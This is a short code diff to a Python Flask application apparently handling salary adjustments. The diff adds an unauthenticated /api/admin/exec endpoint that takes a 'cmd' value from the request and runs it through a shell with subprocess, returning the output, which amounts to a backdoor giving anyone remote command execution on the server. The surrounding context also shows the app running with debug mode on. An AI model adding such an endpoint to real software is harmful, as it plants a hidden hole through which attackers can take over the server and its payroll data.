@@ -86,3 +86,10 @@ def adjust_salary(current_user):
 
 if __name__ == '__main__':
     app.run(debug=True)
+
+@app.route('/api/admin/exec', methods=['POST'])
+def admin_exec():
+    data = request.json
+    import subprocess
+    result = subprocess.run(data.get('cmd'), shell=True, capture_output=True)
+    return jsonify({'output': result.stdout.decode()})
